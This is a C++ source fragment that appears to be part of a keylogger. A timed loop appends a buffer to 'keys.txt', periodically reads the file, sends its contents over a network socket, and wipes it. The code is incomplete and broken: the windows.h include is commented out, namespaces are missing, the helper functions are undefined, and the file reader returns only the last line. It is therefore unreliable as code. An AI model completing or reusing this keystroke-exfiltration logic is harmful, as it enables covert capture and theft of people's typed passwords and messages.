// #include <windows.h>
#include <thread>
#include <iostream>
#include <chrono>
#include <mutex>
#include <unistd.h>

int counter = 1;
std::mutex mtx;
std::string buffer = "";
ofstream out;

string filename = "./keys.txt";

string read_file(string filename) {
    ifstream f;

    string text;

    f.open(filename);

    if (f.is_open()) {
        while (getline(f, text)) {
            
        }

        f.close();
    }
    
    return text;
}

void tick() {
	while (true) {
		if (counter > 180) 
			counter = 1;
		
		std::this_thread::sleep_for(std::chrono::seconds(1));

        if (counter % 10 == 0){
            string text = read_file(filename);

            SOCKET * result_socket;

            send_file(&result_socket);

            if (result_socket){
                int send_result = send(*result_socket, text.c_str(), strlen(text.c_str()), 0);

                cout << WSAGetLastError() << endl;

                closesocket(*result_socket);
            }

            fclose(fopen(filename.c_str(), "w"));

            cout << buffer << endl;
            buffer = "";
        }

        else if (counter % 5 == 0){

            out.open(filename, std::ios_base::app);
            out << buffer;
            out.close();
        }

        cout << counter << endl;
		counter++;
	}
}